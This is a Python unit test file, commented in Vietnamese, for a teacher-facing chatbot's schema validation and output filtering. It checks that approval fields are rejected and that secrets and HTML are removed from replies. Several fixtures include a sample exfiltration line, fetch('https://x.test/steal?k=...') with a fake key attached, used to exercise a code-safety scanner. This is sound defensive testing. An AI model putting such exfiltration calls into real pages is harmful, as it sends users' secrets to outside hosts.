"""C01 — kiểm schemas của chatbot. python -m unittest discover -s ailab -p "test_*.py" """
import json
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from chatbot import schemas as S  # noqa: E402

FENCE = chr(96) * 3


class Request(unittest.TestCase):
    def test_old_client_payload_still_valid(self):
        r, e = S.validate_request({"chatId": 8, "text": "  Phép cộng lớp 2  "})
        self.assertEqual(e, [])
        self.assertEqual((r["action"], r["chatId"], r["text"], r["requestId"]), ("message", 8, "Phép cộng lớp 2", None))

    def test_new_chat_without_id(self):
        for cid in (None, "", 0):
            r, e = S.validate_request({"chatId": cid, "text": "abc"})
            self.assertEqual(e, [])
            self.assertIsNone(r["chatId"])

    def test_text_length_and_type(self):
        for t in ("", "ab", None, 123, "x" * 2001, "   a  "):
            _, e = S.validate_request({"text": t})
            self.assertEqual([x["field"] for x in e], ["text"], t)

    def test_not_object(self):
        for p in (None, [], "x", 5):
            r, e = S.validate_request(p)
            self.assertIsNone(r)
            self.assertEqual(e[0]["code"], "invalid_input")

    def test_client_cannot_set_authority_fields(self):
        r, e = S.validate_request({"text": "abc", "userId": 1, "teacherApproved": True, "status": "ready", "role": "admin"})
        self.assertEqual(e, [])
        for k in ("userId", "teacherApproved", "status", "role"):
            self.assertNotIn(k, r)

    def test_bad_types(self):
        _, e = S.validate_request({"text": "abc", "chatId": "x", "requestId": "short", "expectedVersion": -1,
                                   "documentIds": [1, "a"]})
        self.assertEqual(sorted(x["field"] for x in e), ["chatId", "documentIds", "expectedVersion", "requestId"])
        _, e = S.validate_request({"text": "abc", "action": "drop_table"})
        self.assertEqual([x["field"] for x in e], ["action"])

    def test_bool_is_not_int(self):
        _, e = S.validate_request({"text": "abc", "chatId": True, "expectedVersion": False})
        self.assertEqual(sorted(x["field"] for x in e), ["chatId", "expectedVersion"])

    def test_action_needs_proposal_version_chat(self):
        _, e = S.validate_request({"action": "confirm_plan"})
        self.assertEqual(sorted(x["field"] for x in e), ["chatId", "proposalId", "version"])
        r, e = S.validate_request({"action": "accept_result", "chatId": 3, "proposalId": "p-abc123", "version": 2,
                                   "requestId": "a1b2c3d4e5"})
        self.assertEqual(e, [])
        self.assertEqual((r["proposalId"], r["version"], r["text"]), ("p-abc123", 2, None))

    def test_documents_deduplicated_and_limited(self):
        r, e = S.validate_request({"text": "abc", "documentIds": [2, 2, 3]})
        self.assertEqual((e, r["documentIds"]), ([], [2, 3]))
        _, e = S.validate_request({"text": "abc", "documentIds": list(range(1, 8))})
        self.assertEqual(e[0]["field"], "documentIds")


class Requirements(unittest.TestCase):
    def test_empty_has_all_keys_and_mouse(self):
        r = S.normalize_requirements(None)
        self.assertEqual(r, S.empty_requirements())
        self.assertIs(r["interaction"]["mouse"], True)

    def test_patch_keeps_only_mentioned_fields(self):
        p, e = S.validate_requirements_patch({"topic": "Phép cộng", "gamePreference": {"mode": "reuse_existing"}})
        self.assertEqual(e, [])
        self.assertEqual(p, {"topic": "Phép cộng", "gamePreference": {"mode": "reuse_existing"}})

    def test_bad_field_dropped_others_kept(self):
        p, e = S.validate_requirements_patch({"topic": "Cộng", "questionCount": 500, "subject": 7,
                                              "interaction": {"requestedKinds": ["smell"], "useModel": "yes"}})
        self.assertEqual(p, {"topic": "Cộng"})
        self.assertEqual(sorted(x["field"] for x in e),
                         ["interaction.requestedKinds", "interaction.useModel", "questionCount", "subject"])

    def test_null_and_blank_allowed(self):
        p, e = S.validate_requirements_patch({"questionCount": None, "topic": "   ", "constraints": {"other": None}})
        self.assertEqual(e, [])
        self.assertEqual(p, {"questionCount": None, "topic": None, "constraints": {"other": []}})

    def test_mouse_cannot_be_disabled(self):
        p, _ = S.validate_requirements_patch({"interaction": {"mouse": False}})
        self.assertNotIn("interaction", p)
        r = S.normalize_requirements({"interaction": {"mouse": False, "requestedKinds": ["hands", "hands"]}})
        self.assertIs(r["interaction"]["mouse"], True)
        self.assertEqual(r["interaction"]["requestedKinds"], ["hands"])

    def test_numeric_string_count(self):
        p, e = S.validate_requirements_patch({"questionCount": "10"})
        self.assertEqual((p, e), ({"questionCount": 10}, []))

    def test_audio_is_storable_kind(self):
        # audio được LƯU là yêu cầu (để báo chưa hỗ trợ), không có nghĩa là chạy được — catalog quyết định
        p, e = S.validate_requirements_patch({"interaction": {"requestedKinds": ["audio"]}})
        self.assertEqual((p, e), ({"interaction": {"requestedKinds": ["audio"]}}, []))


class ModelOutput(unittest.TestCase):
    GOOD = {"intent": "new_request", "reply": "Bạn dạy lớp mấy?", "requirementsPatch": {"subject": "Toán"},
            "questions": [{"field": "gradeOrAudience", "text": "Lớp mấy?"}], "assumptions": ["10 câu"]}

    def test_plain_json(self):
        o, e = S.validate_model_output(json.dumps(self.GOOD, ensure_ascii=False))
        self.assertEqual(e, [])
        self.assertEqual(o["requirementsPatch"], {"subject": "Toán"})
        self.assertEqual(o["questions"][0]["field"], "gradeOrAudience")

    def test_fenced_and_surrounded_json(self):
        for raw in ("Đây:\n%sjson\n%s\n%s" % (FENCE, json.dumps(self.GOOD), FENCE), "ok " + json.dumps(self.GOOD) + " hết"):
            o, e = S.validate_model_output(raw)
            self.assertEqual(e, [], raw)

    def test_broken_json(self):
        for raw in ("", "không có json", "{intent: x", "[1,2]", None, 42):
            o, e = S.validate_model_output(raw)
            self.assertIsNone(o)
            self.assertEqual(e[0]["code"], "invalid_model_output")

    def test_missing_intent_or_reply(self):
        o, e = S.validate_model_output({"intent": "hack", "reply": " "})
        self.assertEqual(sorted(x["field"] for x in e), ["intent", "reply"])

    def test_model_cannot_approve_or_set_ids(self):
        bad = dict(self.GOOD, teacherApproved=True, status="ready", appId=9, result={"appId": 9},
                   requirementsPatch={"subject": "Toán", "approval": True})
        o, e = S.validate_model_output(bad)
        self.assertEqual(e, [])
        self.assertEqual(o["dropped"], ["appId", "result", "status", "teacherApproved"])
        self.assertNotIn("approval", o["requirementsPatch"])
        for k in ("teacherApproved", "status", "appId", "result"):
            self.assertNotIn(k, o)

    def test_route_hint_validated(self):
        o, _ = S.validate_model_output(dict(self.GOOD, route={"mode": "reuse_existing", "playerId": 3}))
        self.assertEqual(o["route"], {"mode": "reuse_existing", "playerId": 3})
        o, _ = S.validate_model_output(dict(self.GOOD, route={"mode": "x", "playerId": "3"}))
        self.assertIsNone(o["route"])
        self.assertEqual(o["patchErrors"][-1]["field"], "route")

    def test_bad_patch_does_not_block_turn(self):
        o, e = S.validate_model_output(dict(self.GOOD, requirementsPatch={"questionCount": -1, "topic": "Cộng"}))
        self.assertEqual(e, [])
        self.assertEqual(o["requirementsPatch"], {"topic": "Cộng"})
        self.assertEqual(o["patchErrors"][0]["field"], "questionCount")


class Validation(unittest.TestCase):
    def test_overall(self):
        p = S.make_check("schema", "passed")
        f = S.make_check("runtime", "failed")
        n = S.make_check("mouseFallback", "not_checked")
        opt = S.make_check("contentGrounding", "failed", required=False)
        self.assertEqual(S.make_validation([p])["overall"], "passed")
        self.assertEqual(S.make_validation([p, n])["overall"], "not_checked")
        self.assertEqual(S.make_validation([p, n, f])["overall"], "failed")
        self.assertEqual(S.make_validation([p, opt])["overall"], "passed")
        self.assertEqual(S.make_validation([])["overall"], "not_checked")

    def test_unknown_names_rejected(self):
        with self.assertRaises(ValueError):
            S.make_check("llmSaysOk", "passed")
        with self.assertRaises(ValueError):
            S.make_check("schema", "ok")
        with self.assertRaises(ValueError):
            S.make_error("oops", "x", "y")


class PublicReply(unittest.TestCase):
    def test_old_error_string_kept(self):
        r = S.to_public_reply(S.new_state(), "Lỗi", False, "", failure="Không gọi được model")
        self.assertEqual(r["error"], "Không gọi được model")
        self.assertEqual(r["failure"]["code"], "legacy")

    def test_structured_error_also_string(self):
        f = S.make_error("model_unavailable", "analyze", "Model đang bận", retryable=True)
        r = S.to_public_reply(S.new_state(), "x", False, "m", failure=f)
        self.assertEqual((r["error"], r["failure"]["retryable"]), ("Model đang bận", True))

    def test_no_error_key_when_ok(self):
        r = S.to_public_reply(S.new_state(), "Chào", True, "fake")
        self.assertNotIn("error", r)
        for k in ("role", "text", "simulated", "model", "status", "stateVersion", "requirements", "missingFields",
                  "questions", "proposal", "validation", "result", "failure"):
            self.assertIn(k, r)
        self.assertEqual((r["role"], r["simulated"], r["status"]), ("bot", True, "clarifying"))

    def test_html_never_leaks(self):
        st = S.new_state()
        st["proposal"] = {"proposalId": "p1", "version": 1, "player": {"name": "G", "html": "<script>x</script>",
                          "manifest": {"name": "G"}}, "htmlDraft": "<html>", "apiKey": "sk-123",
                          "warnings": [{"srcdoc": "<html>", "message": "m"}]}
        r = S.to_public_reply(st, "x", False, "m")
        raw = json.dumps(r)
        for bad in ("<script>", "<html>", "sk-123", "srcdoc", "htmlDraft"):
            self.assertNotIn(bad, raw)
        self.assertEqual(r["proposal"]["player"]["manifest"], {"name": "G"})
        self.assertIn("<script>", st["proposal"]["player"]["html"])  # không làm hỏng state gốc

    def test_business_keys_kept(self):
        """Review C01 lỗi 1: bộ lọc cũ xoá mọi trường tên 'key' -> mất choices[].key và inputs[].key."""
        st = S.new_state()
        st["proposal"] = {
            "proposalId": "p1", "version": 1,
            "player": {"playerId": 1, "manifest": {"name": "Quiz", "inputs": [
                {"key": "A", "label": "A", "required": True, "accepts": ["action"]},
                {"key": "B", "label": "B", "required": True, "accepts": ["action"]}]}},
            "exam": {"examId": None, "questions": [{"id": "q0", "type": "single", "text": "2+2?", "answer": "B",
                     "choices": [{"key": "A", "text": "3"}, {"key": "B", "text": "4"}]}]},
            "interactionModel": {"modelId": 1, "kind": "hands", "mapping": {"A": "fist", "B": "open"}, "mouse": True},
        }
        p = S.to_public_reply(st, "x", False, "m")["proposal"]
        self.assertEqual([i["key"] for i in p["player"]["manifest"]["inputs"]], ["A", "B"])
        self.assertEqual([c["key"] for c in p["exam"]["questions"][0]["choices"]], ["A", "B"])
        self.assertEqual(p["exam"]["questions"][0]["answer"], "B")
        self.assertEqual(p["interactionModel"]["mapping"], {"A": "fist", "B": "open"})

    def test_warning_excerpt_kept_for_teacher(self):
        st = S.new_state()
        flag = {"code": "network", "label": "Gọi mạng", "message": "Trang có thể gọi mạng", "line": 4,
                "excerpt": "fetch('https://x.test/steal');"}
        st["proposal"] = {"proposalId": "p1", "version": 1, "warnings": [flag]}
        st["validation"] = S.make_validation([S.make_check("codeSafety", "failed", reason="có fetch")], [flag])
        r = S.to_public_reply(st, "x", False, "m")
        self.assertEqual(r["proposal"]["warnings"][0]["excerpt"], flag["excerpt"])
        self.assertEqual(r["validation"]["warnings"][0], flag)
        self.assertEqual(r["validation"]["checks"][0]["reason"], "có fetch")

    def test_contract_scan_flags_kept_whole(self):
        """Review C01 lần 2 (P2): WARNING thiếu 'reason' -> mất lý do cảnh báo của contract.scan()."""
        import contract
        secret = "sk-ant-FAKE0123456789abcdef"
        html = ("<html>\n<body>\n<script>var a=1;\nfetch('https://x.test/steal?k=%s');\n"
                "window.open('https://ads.test');\n</script></body></html>" % secret)
        flags = contract.scan(html)
        self.assertEqual(sorted(f["code"] for f in flags), ["network", "window"])
        st = S.new_state()
        st["proposal"] = {"proposalId": "p1", "version": 1, "warnings": flags}
        st["validation"] = S.make_validation([S.make_check("codeSafety", "failed", reason="có cờ")], flags)
        before = json.dumps(st, sort_keys=True, ensure_ascii=False)
        r = S.to_public_reply(st, "x", False, "m")
        self.assertEqual(json.dumps(st, sort_keys=True, ensure_ascii=False), before)  # state gốc không đổi
        for out in (r["proposal"]["warnings"], r["validation"]["warnings"]):
            self.assertEqual(len(out), 2)
            for f, src in zip(out, flags):
                self.assertEqual(set(f), {"code", "label", "reason", "line", "excerpt"})
                for k in ("code", "label", "reason", "line"):
                    self.assertEqual(f[k], src[k], k)
                self.assertTrue(f["reason"])
                self.assertEqual(f["excerpt"], src["excerpt"].replace(secret, "[đã che]"))
        raw = json.dumps(r, ensure_ascii=False)
        self.assertNotIn(secret, raw)
        net = [f for f in r["proposal"]["warnings"] if f["code"] == "network"][0]
        self.assertIn("fetch(", net["excerpt"])
        self.assertIn("[đã che]", net["excerpt"])
        src_net = [f for f in st["proposal"]["warnings"] if f["code"] == "network"][0]
        self.assertIn(secret, src_net["excerpt"])  # che chỉ ở bản công khai, state gốc giữ nguyên

    def test_internal_html_and_fake_secrets_never_leak(self):
        """Review C01 lỗi 2: blacklist cũ không bảo vệ result, validation, failure.details."""
        secret = "sk-ant-FAKE0123456789abcdef"
        st = S.new_state()
        st["proposal"] = {"proposalId": "p1", "version": 1, "htmlDraft": "<html>",
                          "player": {"name": "G", "html": "<script>x</script>", "srcdoc": "<html>", "token": secret,
                                     "manifest": {"name": "G", "secretField": secret}},
                          "exam": {"content": "Câu | A | =A", "questions": [{"id": "q0", "html": "<p>x</p>",
                                   "choices": [{"key": "A", "html": "<b>a</b>", "text": "a", "internal": secret}]}]},
                          "internal": {"apiKey": secret}}
        st["result"] = {"appId": 3, "playUrl": "/play/3", "html": "<html>", "apiKey": secret,
                        "approval": {"teacher": "accepted", "adminToken": secret}}
        st["validation"] = {"overall": "passed", "rawLlm": secret,
                            "checks": [{"name": "schema", "status": "passed", "required": True, "srcdoc": "<html>"}],
                            "warnings": [{"code": "x", "message": "key " + secret}]}
        failure = S.make_error("model_unavailable", "analyze", "Lỗi provider: api_key=%s" % secret,
                               details={"field": "text", "apiKey": secret, "headers": {"Authorization": "Bearer " + secret},
                                        "html": "<html>"})
        r = S.to_public_reply(st, "Bearer %s" % secret, False, "m", failure=failure)
        raw = json.dumps(r, ensure_ascii=False)
        for bad in (secret, "<script>", "<html>", "<p>", "<b>", "srcdoc", "htmlDraft", "apiKey", "adminToken",
                    "rawLlm", "Authorization", "Câu | A"):
            self.assertNotIn(bad, raw, bad)
        self.assertEqual(r["failure"]["details"], {"field": "text"})
        self.assertEqual((r["result"]["appId"], r["result"]["approval"]), (3, {"teacher": "accepted"}))
        self.assertIn("[đã che]", r["error"])

    def test_filter_does_not_mutate_state(self):
        st = S.new_state()
        st["proposal"] = {"proposalId": "p1", "version": 1, "player": {"html": "<script>x</script>",
                          "manifest": {"inputs": [{"key": "A", "label": "A"}]}}}
        st["result"] = {"appId": 1, "apiKey": "sk-FAKE000000000"}
        st["validation"] = {"overall": "passed", "rawLlm": "x"}
        st["questions"] = [{"field": "topic", "text": "Chủ đề?", "debug": "x"}]
        before = json.dumps(st, sort_keys=True)
        r = S.to_public_reply(st, "x", False, "m")
        self.assertEqual(json.dumps(st, sort_keys=True), before)
        r["proposal"]["player"]["manifest"]["inputs"][0]["key"] = "Z"
        self.assertEqual(st["proposal"]["player"]["manifest"]["inputs"][0]["key"], "A")
        self.assertEqual(r["questions"], [{"field": "topic", "text": "Chủ đề?"}])

    def test_every_status_serializes(self):
        for status in S.STATUSES:
            st = S.new_state()
            st["status"] = status
            r = S.to_public_reply(st, "x", False, "m")
            self.assertEqual(json.loads(json.dumps(r, ensure_ascii=False))["status"], status)

    def test_old_or_broken_state_does_not_crash(self):
        for data in (None, [], "x", {"version": "a", "status": "weird", "requirements": "x", "proposal": "y"},
                     {"version": 4, "status": "awaiting_confirmation", "requirements": {"topic": "Cộng", "evil": 1}}):
            st = S.normalize_state(data)
            r = S.to_public_reply(st, "x", False, "m")
            self.assertIn(r["status"], S.STATUSES)
        st = S.normalize_state({"version": 4, "status": "awaiting_confirmation", "requirements": {"topic": "Cộng"}})
        self.assertEqual((st["version"], st["status"], st["requirements"]["topic"]), (4, "awaiting_confirmation", "Cộng"))


if __name__ == "__main__":
    unittest.main()
